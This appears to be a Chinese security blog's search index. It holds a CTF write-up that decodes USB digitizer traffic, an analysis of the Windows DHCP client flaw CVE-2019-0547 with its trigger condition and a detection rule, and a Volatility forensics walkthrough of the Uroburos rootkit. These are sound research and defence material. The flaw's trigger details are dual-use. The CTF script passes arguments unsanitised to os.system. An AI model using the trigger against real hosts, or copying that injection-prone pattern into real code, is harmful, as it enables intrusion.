mousePositionX = 0 mousePositionY = 0 X = [] Y = [] DataFileName = \"test.txt\" data = [] def main(): global mousePositionX global mousePositionY # check argv if len(sys.argv) == 1: print \"Usage : \" print \" python UsbDigitizerHacker.py data.pcap [Conditions used to sort]\" print \"Tips : \" print \" To use this python2 script , you must install the numpy,matplotlib first.\" print \" You can use `sudo pip install matplotlib numpy` to install it\" exit(1) # get argv pcapFilePath = sys.argv[1] print pcapFilePath # get data of pcap if len(sys.argv)==2: command = \"tshark -r '%s' -T fields -e usb.capdata \u003e %s\" % ( pcapFilePath, DataFileName) print command os.system(command) if len(sys.argv)==3: Conditions=sys.argv[2] command = \"tshark -r '%s' -T fields -e usb.capdata -Y '%s' \u003e %s\" % ( pcapFilePath,Conditions, DataFileName) print command os.system(command) with open(DataFileName, \"rb\") as f: flag=1 for line in f: if line[24:26] != \"00\": print line data.append(line[0:-1]) for line in data: x0=int(line[6:8],16) x1=int(line[9:11],16) x=x0+x1*256 y0=int(line[15:17],16) y1=int(line[18:20],16) y=y0+y1*256 X.append(x) Y.append(-y) #draw fig = plt.figure() ax1 = fig.add_subplot(111) ax1.set_title('[%s]' % (pcapFilePath)) ax1.scatter(X, Y, c='r', marker='o') plt.savefig(\"out.png\") plt.show() #clean temp data os.system(\"rm ./%s\" % (DataFileName)) if __name__ == \"__main__\": main() 这里可以得到图如下所示： 哦！flag！我直接提交，然而。。。错误。 到此为止，我花了半天的时间去搞完这些操作，最后也得到一个高度仿真的flag。然而提示我错误？思路中断，， 第二天，早上醒来，突然想到flag.txt还没有用过！打开，直接复制去UTF-8解码（其实有点气急败坏了），发现不对。至此，比赛结束。然后，我发现这是emoji！！！！！去解码，key用上面那个图中的字符串： 然而，时间已经过去了，，，比赛结束了。 ","date":"2019-10-26","objectID":"/ctf/roarctf/:3:0","tags":["Roarctf","CTF"],"title":"RoarCTF Misc Davinci-Cipher writeup","uri":"/ctf/roarctf/"},{"categories":["Tech"],"content":"CVE-2019-0547 Microsoft Windows DHCP Client 代码执行漏洞分析","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞描述 CVE-2019-0547，一个Windows系统下DHCP客户端的任意代码执行漏洞，漏洞的主要原因是对DHCP消息的错误的处理方式造成内存损坏。攻击者可以通过构造恶意的DHCP响应数据包到存在漏洞的系统中来触发漏洞，最终可以实现以管理员权限执行任意代码，危害巨大。 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:1","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞影响范围 • Microsoft Windows10 version1803 • Microsoft Windows Serverversion 1803(ServerCoreInstallation) 该漏洞影响的系统版本只有两个，但是随着系统版本迭代，现在使用Windows 10的人越来越多，这个漏洞还是需要关注的。 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:2","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞基本信息 漏洞触发文件：DHCP服务主机上运行的dcpcore.dll 漏洞触发函数：dhcpcore!DecodeDomainSearchListData() 漏洞触发数据对象：一个原本用于存储域搜索结果的堆缓冲区 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:3","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"漏洞分析 基础知识 动态主机配置协议(DHCP)，主要用于集中管理和自动化网络上IP地址的分配。 它是BOOTP协议的扩展。 除了IP地址分配外，DHCP客户端还从DHCP服务器接收管理其网络配置所需的信息，包括子网掩码，网关地址，DNS服务器地址等。 DHCP使用UDP端口67和68进行通信。 DHCP在所有现代操作系统上都是标准的-并且默认情况下已对网络接口启用-在Microsoft Windows上。 典型的DHCP事务流程如下： client发送DHCP DISCOVER到server server发送DHCP OFFER到client client发送DHCP REQUEST到server server响应一个DHCP ACK到client 总结上面的过程，DHCP的工作方式如下：在客户端获取IP地址之前，它会在本地网络上广播DHCP DISCOVER消息。 本地网络上的任何DHCP服务器都可以使用DHCP OFFER响应，其中包含分配给客户端的IP地址。 该IP地址通常是租用的，这意味着它会在一定时间后过期。为了续订租约，客户端向DHCP服务器发送单播DHCP REQUEST消息。 DHCP服务器以DHCP ACK消息响应。 所有DHCP message均以通用的报头结构开头。所有多字节值均以网络字节顺序排列。 该结构描述如下[1]： offset size value 0x0000 1 Operation code (1 - request, 2 - response) 0x0001 1 Hardware type (1 - Ethernet) 0x0002 1 Hardware address length (usually 6 for Ethernet) 0x0003 1 Hops 0x0004 4 Transaction ID 0x0008 2 Time since client started 0x000A 2 Flags 0x000C 4 Client IP address if assigned 0x0010 4 Client IP address 0x0014 4 Next server IP address 0x0018 4 Relay IP address 0x001C 16 Client hardware address 0x002C 64 Server hostname (optional) 0x006C 128 Boot file name 0x00EC 4 Magic cookie (0x63 0x82 0x53 0x63) 0x00F0 variable Options 通用标头的长度是固定的，但是后面可以跟可变长度的DHCP选项。 每个单独的DHCP选项具有以下格式： Offset Size Value 0000 1 Option tag 0001 1 Option length (len) 0002 len Option data 除了IP地址（包含在“客户端IP地址”字段中）之外，DHCP message还使用“option”来包括其他几个配置参数，例如“子网掩码”（option tag：1），“路由器”（option tag：3），DNS服务器（option tag：6），NTP服务器（option tag：4），域搜索（option tag：119）。 有关标准option tag的列表，请参见[3]。 该漏洞主要与“域搜索”选项有关，该选项包含一个或多个DNS后缀，如果DNS名称不能自行解析，则客户端可以使用该后缀附加到DNS名称。 例如，考虑将分发“example.com”的DHCP服务器作为域搜索DNS后缀。 如果客户端向DNS查询“foo”，但没有收到任何DNS记录，则它将继续查询“foo.example.com”。使用此功能可避免对网络内的所有主机重复使用通用组织DNS后缀。 域搜索选项的选项数据字段包含wire format的DNS名称列表。DNS名称对一个或多个DNS标签进行编码，并以终止于零的字符结尾。DNS标签可以压缩或不压缩。未压缩的DNS标签是一字节长度的前缀的八位字节字符串。压缩标签是一个两字节的无符号整数值，其前两个最高有效位设置为1，其余位以字节为单位存储偏移量。因此，单个DNS名称可能由压缩和未压缩标签混合组成。DNS根目录“.”由单字节“\\x00”表示。使用未压缩的名称编码DNS名称“example.example.com”将变成“ \\x07example\\x07example\\x03com\\x00”。可以使用压缩标签将其编码如下：“\\x07example\\xc0\\x00\\x03com\\x00”。有关DNS名称的更多信息，请参见[2]。 原理分析 在Windows的DHCP客户端中存在越界写漏洞。DHCP客户端在启动时作为svchost.exe服务运行，并遵循DHCP协议来获取系统上网络接口的IP地址。当收到DHCP答复时，它将使用dhcpcore解析DHCP选项！ DhcpExtractFullOptions()，当遇到域搜索选项（option tag：119）时，该调用再调用dhcpcore！DecodeDomainSearchListData()。此函数主要将wire format的DNS名称转换为基于文本的DNS名称。它遍历每个DNS名称，在堆上分配内存，解压缩遇到的任何标签，并使用memcpy()复制标签，并在标签之间插入“.”，名称之间插入\",\"。用于存储DNS名称的已分配缓冲区大小是基于长度的字符串，并且由于DNS名称以空值结尾，因此缓冲区大小比DNS名称小1。因此，DNS名称“\\x07example\\x03com\\x00”导致缓冲区大小为12（请注意，字符串的长度为13）。如果DHCP回复消息包含前两个字节为零的域搜索选项，则调用程序函数将它们视为两个不同名称的两个以空字符结尾的字符，并将大小为0传递给dhcpcore！DecodeDomainSearchListData()，该函数将无法正确验证，而是调用HeapAlloc分配0字节的缓冲区。然后，它继续处理两个根标签，并写入无效缓冲区，从而导致越界写入。 攻击者可以设置一个恶意的DHCP服务器并使用恶意的DHCP响应消息来响应同一网段中的DHCP请求，从而利用该漏洞。 代码分析 分析使用的dhcpcore.dll版本为10.0.17134.191。 ; dhcpcore!DecodeDomainSearchListData: 6ffcb0cc 8bff mov edi,edi 6ffcb0ce 55 push ebp 6ffcb0cf 8bec mov ebp,esp 6ffcb0d1 83ec2c sub esp,2Ch 6ffcb0d4 8bc2 mov eax,edx 6ffcb0d6 894de4 mov dword ptr [ebp-1Ch],ecx 6ffcb0d9 8bc8 mov ecx,eax 6ffcb0db 8945f0 mov dword ptr [ebp-10h],eax 6ffcb0de 53 push ebx 6ffcb0df 8b5d0c mov ebx,dword ptr [ebp+0Ch] 6ffcb0e2 33d2 xor edx,edx 6ffcb0e4 c1e902 shr ecx,2 6ffcb0e7 83c164 add ecx,64h 6ffcb0ea 56 push esi 6ffcb0eb 33f6 xor esi,esi 6ffcb0ed 894dd4 mov dword ptr [ebp-2Ch],ecx 6ffcb0f0 8b4df0 mov ecx,dword ptr [ebp-10h] 6ffcb0f3 83f802 cmp eax,2 6ffcb0f6 57 push edi 6ffcb0f7 8b7d14 mov edi,dword ptr [ebp+14h] 6ffcb0fa 1bc0 sbb eax,eax 6ffcb0fc 40 inc eax 6ffcb0fd 8907 mov dword ptr [edi],eax ; 外层循环开始 6ffcb0ff 833f00 cmp dword ptr [edi],0 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx ; edx是计数器 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx ; 第一次迭代时跳过HeapFree 6ffcb10c 83fa02 cmp edx,2 6ffcb0fd 8907 mov dword ptr [edi],eax 6ffcb0ff 833f00 cmp dword ptr [edi],0 ; 第二次迭代, HeapFree and HeapAlloc都发生了. 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx 6ffcb10c 83fa02 cmp edx,2 6ffcb10f 7533 jne dhcpcore!DecodeDomainSearchListData+0x78 6f","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:4","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"检测思路 首先要监听UDP的67/68端口的流量。检测设备可以根据DHCP Magic Cookie值\\x63\\x82\\x53\\x63来判断是否为DHCP消息。 如果操作码为2，则检测设备必须解析每个DHCP选项，并检查option tag设置为0x77的所有选项的选项数据。如果发现任何此类选项的选项数据以“\\x00\\x00”开头，则应将流量视为可疑的攻击流量。 ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:0:5","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"总结 这个分析思路很清楚，基本上是一个漏洞响应的微缩过程，到最后给出解决方案，个人感觉比较成熟。最后的流量检测现在很多的防火墙都可以实现，从流量侧拦截攻击好过主机防御。 参考文献 [1] RFC 2131, Dynamic Host Configuration Protocol https://tools.ietf.org/html/rfc2131 [2] P. Mockapetris, RFC 1035: DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION, https://tools.ietf.org/html/rfc1035 [3] IANA, Dynamic Host Configuration Protocol (DHCP)and Bootstrap Protocol (BOOTP) Parameters, https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml ","date":"2019-10-24","objectID":"/2019/10/CVE-2019-0547/:1:0","tags":["Security","CVE-2019-0547"],"title":"CVE-2019-0547 Analyse","uri":"/2019/10/CVE-2019-0547/"},{"categories":["Tech"],"content":"A simple analyse of Uroburos Rootkit","date":"2019-10-24","objectID":"/2019/10/rootkit/","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"Uroburos Rootkit中的HOOK的简单分析以及驱动的提取 Uroburos是一个rootkit，由两个文件，一个驱动程序和一个加密的虚拟文件系统组成。它可以窃取信息（最著名的是：文件），还可以捕获网络流量。它的模块化结构使其可以轻松扩展新功能，这不仅使其非常复杂，而且具有很高的灵活性和危险性。Uroburos的驱动程序部分非常复杂，并且设计得非常离散且很难识别。 本文章的分析基于BAE Systems的report以及spresec的博客，使用的样本为626576e5f0f85d77c460a322a92bb267，使用的主要工具为volatility（rekall也可以）。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:0:0","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"Hook分析 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:0","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"查找函数hook 根据BAE Systems的report，该rootkit对IoCreateDevice()函数进行了hook。我们通过一个受该rootkit映像的image来对该hook进行分析。 使用volatility的enumfunc插件来列举出所有导出函数的内存地址： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 enumfunc -K -E | grep IoCreateDevice Volatility Foundation Volatility Framework 2.3.1 \u003cKERNEL\u003e Export ntoskrnl.exe 340 0x000000008056aad6 IoCreateDevice 使用volshell来查看该函数是如何被hook的： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 volshell Volatility Foundation Volatility Framework 2.3.1 Current context: process System, pid=4, ppid=0 DTB=0x334000 Welcome to volshell! Current memory image is: ./uroburos_mod.vmem To get help, type 'hh()' \u003e\u003e\u003e dis(0x000000008056aad6) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX 从上面的结果可以看出，0x1被压入栈中，然后INT 0xc3执行一个中断。我们进一步跟进这个中断，看一下它的具体信息。 使用idt查看一下IDT： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.mem --profile=WinXPSP3x86 idt Volatility Foundation Volatility Framework 2.3.1 CPU Index Selector Value Module Section ------ ------ ---------- ---------- -------------------- ------------ [snip] 0 BC 0x8 0x8053d0b8 ntoskrnl.exe .text 0 BD 0x8 0x8053d0c2 ntoskrnl.exe .text 0 BE 0x8 0x8053d0cc ntoskrnl.exe .text 0 BF 0x8 0x8053d0d6 ntoskrnl.exe .text 0 C0 0x8 0x8053d0e0 ntoskrnl.exe .text 0 C1 0x8 0x806d1984 hal.dll .text 0 C2 0x8 0x8053d0f4 ntoskrnl.exe .text 0 C3 0x8 0x896a3670 UNKNOWN 0 C4 0x8 0x8053d108 ntoskrnl.exe .text 0 C5 0x8 0x8053d112 ntoskrnl.exe .text 0 C6 0x8 0x8053d11c ntoskrnl.exe .text 0 C7 0x8 0x8053d126 ntoskrnl.exe .text 0 C8 0x8 0x8053d130 ntoskrnl.exe .text [snip] 在上面的结果中，我们可以发现，INT 0xc3处理的中断位于一个名为“UNKNOWN”的模块中。无法正确识别出来这是不是系统模块，说明确实有问题。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:1","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"修改volatility的apihooks插件 通过前面几步操作，我们可以确认hook的地址。但是需要更多的信息，最好是能看到hook的具体操作内容和流程。因为volatility的原生apihooks.py是不支持内联中断hook的，所以需要对原生插件做一个改进。 原生apihooks.py中有个check_inline()函数，可以看到其代码是典型的内联hook的逻辑，该内联hook在当前模块，无条件的jmps，push/ret等的外部寻找调用。不幸的是，该rootkit没有使用任何这些方法。 在修改了一些代码之后，添加了以下逻辑来处理内联中断hook： elif op.flowControl == \"FC_INT\" and idt: # Clear the push value if push_val: push_val = None # Check for INT, ignore INT3 if op.mnemonic == \"INT\" and op.size \u003e 1 and op.operands[0].type == 'Immediate': # Check interrupt handler address d = idt[op.operands[0].value] if d and outside_module(d): break 将修改后的插件合入volatility，然后重新运行： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 apihooks -P Volatility Foundation Volatility Framework 2.3.1 ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IoCreateDevice at 0x8056aad6 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX 0x8056aae9 8b4508 MOV EAX, [EBP+0x8] 0x8056aaec 89 DB 0x89 0x8056aaed 45 INC EBP Disassembly(1): 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IofCallDriver at 0x804ee120 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x804ee120 6a00 PUSH 0x0 0x804ee122 cdc3 INT 0xc3 0x804ee124 90 NOP 0x804ee125 90 NOP [snip] ok，这次没有问题了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:2","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"Hook的详细分析 到现在为止，我们可以跟深入跟踪处理hook的指令进行更详细的分析了。重新使用volshell插件来看一下处理IoCreateDevice()的hook的具体函数： \u003e\u003e\u003e dis(0x000000008056aad6, 0xb) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 \u003e\u003e\u003e dis(0x896a3670, 0x18) 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF \u003e\u003e\u003e dis(0x896a3688, 0x29) 0x896a3688 fb STI 0x896a3689 50 PUSH EAX 0x896a368a 51 PUSH ECX 0x896a368b 0fb6442414 MOVZX EAX, BYTE [ESP+0x14] 0x896a3690 8b4c2418 MOV ECX, [ESP+0x18] 0x896a3694 894c2414 MOV [ESP+0x14], ECX 0x896a3698 8b0d506c6c89 MOV ECX, [0x896c6c50] 0x896a369e 8d04c1 LEA EAX, [ECX+EAX*8] 0x896a36a1 8b4804 MOV ECX, [EAX+0x4] 0x896a36a4 894c2418 MOV [ESP+0x18], ECX 0x896a36a8 59 POP ECX 0x896a36a9 8b00 MOV EAX, [EAX] 0x896a36ab 870424 XCHG [ESP], EAX 0x896a36ae c20c00 RET 0xc \u003e\u003e\u003e dd(0x896c6c50, 1) 896c6c50 89a2d800 \u003e\u003e\u003e dd(0x89a2d800+1*8, 1) 89a2d808 8963a020 \u003e\u003e\u003e dis(0x8963a020, 0xb) 0x8963a020 55 PUSH EBP 0x8963a021 8bec MOV EBP, ESP 0x8963a023 83ec18 SUB ESP, 0x18 0x8963a026 e875fd0100 CALL 0x89659da0 现在我们找到了处理hook的详细的函数代码，我们可以将内存导出，然后使用IDA进行分析。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:3","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"导出驱动 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:0","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"追踪内存中的驱动 我们直接使用volatility的modlist插件，并没有发现任何有价值的消息。之前为rootkit驱动程序确定的内存空间中似乎没有模块。我们注意到驱动程序似乎占用了很大的内存空间，我们可以从目前为止确定的最低地址开始向后搜索内存。寻找PE头，以0x8963a020为起点，向后看0x6000字节。 \u003e\u003e\u003e db(0x8963a020-0x6000, 0x6000) 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... [snip] 在上面的结果中，我们看到了DOS头，然后往前看一点，去寻找“MZ”： \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 00 00 00 00 03 00 00 00 04 00 00 00 ff ff 00 00 ................ 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... 奇怪的是“MZ”和“PE”的魔术字都没有找到，这意味moddump插件可能存在问题，需要进行修改。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:1","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"修补内存 volatility有个patcher插件可以处理这种情况。我们首先要写一个xml文件来修补PE头： 这将在每个页面边界的起始位置搜索我们在内存中找到的驱动程序的开始字节，并为结构正确的PE头插入魔术字。 $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 patcher -w -x patchdriver.xml Volatility Foundation Volatility Framework 2.3.1 Write support requested. Please type \"Yes, I want to enable write support\" below precisely (case-sensitive): Yes, I want to enable write support Calibrating for speed: Reading patch locations per page Patching Fix Driver MZ Header at page 9634000 看起来没有问题，我们检查一下： \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 50 45 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 PE..L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... OK,这次就没有问题了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:2","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":["Tech"],"content":"转储驱动程序 现在PE结构已经修复了，我们可以从内存中将驱动程序转储出来： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 moddump -b 0x89634000 -D . Volatility Foundation Volatility Framework 2.3.1 Module Base Module Name Result ----------- -------------------- ------ 0x089634000 UNKNOWN OK: driver.89634000.sys 这里需要注意的是，我们使用moddump插件进行内存转储时，并没有修复ImageBase，所以需要我们进行手动修复。这里可以使用pefile库： \u003e\u003e\u003e import pefile \u003e\u003e\u003e pe = pefile.PE('driver.89634000.sys') \u003e\u003e\u003e hex(pe.OPTIONAL_HEADER.ImageBase) '0x10000' \u003e\u003e\u003e pe.OPTIONAL_HEADER.ImageBase = 0x89634000 \u003e\u003e\u003e pe.write(filename='driver.89634000_mod.sys') OK，到此为止，转储出来的驱动程序应该就没有问题了，使用IDA打开看一下： 没有问题，现在就可以使用IDA进行深入的静态分析了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:3","tags":["Security","Rootkit"],"title":"Uroburos Rootkit Analyse","uri":"/2019/10/rootkit/"},{"categories":null,"content":"Hugo 主题 LoveIt \" ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"我是谁  漏洞练习生：长期处于漏洞领域的学习和练习中，什么时候出道全看天  音乐忠实爱好者：属于没有音乐活不了的那种  看雪二进制漏洞版本小版主：何其有幸能为教会我许多的看雪论坛贡献自己的一份力量  羽毛球国家1亿级运动员：长期稳定占据该等级王者位置  MOBA游戏辅助迷：爱打辅助不是因为我菜，只是不想打击祖国电竞未来的希望 性能和 SEO  性能优化：在 Google PageSpeed Insights 中， 99/100 的移动设备得分和 100/100 的桌面设备得分  使用基于 JSON-LD 格式 的 SEO SCHEMA 文件进行 SEO 优化  支持 Google Analytics  支持 Fathom Analytics  支持搜索引擎的网站验证 (Google, Bind, Yandex and Baidu)  支持所有第三方库的 CDN  基于 lazysizes 自动转换图片为懒加载 外观和布局 / 响应式布局 / 浅色/深色 主题模式  全局一致的设计语言  支持分页  易用和自动展开的文章目录  支持多语言和国际化  美观的 CSS 动画 社交和评论系统  支持 Gravatar 头像  支持本地头像  支持多达 64 种社交链接  支持多达 28 种网站分享  支持 Disqus 评论系统  支持 Gitalk 评论系统  支持 Valine 评论系统  支持 Facebook 评论系统  支持 Telegram comments 评论系统  支持 Commento 评论系统  支持 Utterances 评论系统 扩展功能  支持基于 Lunr.js 或 algolia 的搜索  支持 Twemoji  支持代码高亮  一键复制代码到剪贴板  支持基于 lightgallery.js 的图片画廊  支持 Font Awesome 图标的扩展 Markdown 语法  支持上标注释的扩展 Markdown 语法  支持分数的扩展 Markdown 语法  支持基于 $ \\KaTeX $ 的数学公式  支持基于 mermaid 的图表 shortcode  支持基于 ECharts 的交互式数据可视化 shortcode  支持基于 Mapbox GL JS 的 